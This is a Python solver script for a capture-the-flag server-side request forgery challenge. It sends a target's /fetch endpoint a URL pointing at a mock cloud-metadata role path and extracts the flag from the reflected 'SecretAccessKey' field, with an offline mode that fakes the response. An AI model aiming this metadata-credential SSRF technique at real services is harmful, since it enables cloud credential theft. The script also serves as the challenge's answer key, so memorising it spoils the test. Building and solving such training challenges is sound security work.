"""Deterministic SSRF solver used as offline and live solution evidence."""
import json
import re
import sys
import urllib.parse
import urllib.request

from metadata import FLAG, ROLE_PATH

FLAG_RE = re.compile(r"T3MP3ST\{[a-zA-Z0-9_]+\}")
MOCK_URL = "http://metadata-mock:8080" + ROLE_PATH


def recover(payload: str) -> str:
    outer = json.loads(payload)
    metadata = json.loads(outer["body"])
    flag = metadata["SecretAccessKey"]
    if metadata.get("Notice") != "SYNTHETIC CTF DATA - NOT A CLOUD CREDENTIAL":
        raise ValueError("metadata response is not visibly synthetic")
    if not FLAG_RE.fullmatch(flag):
        raise ValueError("metadata response does not carry a valid flag")
    return flag


def run_live(root: str) -> str:
    body = urllib.parse.urlencode({"url": MOCK_URL}).encode()
    request = urllib.request.Request(root.rstrip("/") + "/fetch", data=body, method="POST")
    with urllib.request.urlopen(request, timeout=5) as response:
        return recover(response.read().decode())


def run_offline() -> str:
    synthetic = json.dumps({
        "upstream_status": 200,
        "content_type": "application/json",
        "body": json.dumps({
            "SecretAccessKey": FLAG,
            "Notice": "SYNTHETIC CTF DATA - NOT A CLOUD CREDENTIAL",
        }),
    })
    return recover(synthetic)


if __name__ == "__main__":
    url_root: str | None = None
    args = iter(sys.argv[1:])
    for arg in args:
        if arg == "--url":
            url_root = next(args)
        elif arg.startswith("--url="):
            url_root = arg.split("=", 1)[1]
        else:
            raise SystemExit(f"unknown argument: {arg}")
    result = run_live(url_root) if url_root else run_offline()
    assert result == FLAG, "extracted flag does not match the committed synthetic constant"
    print(result)
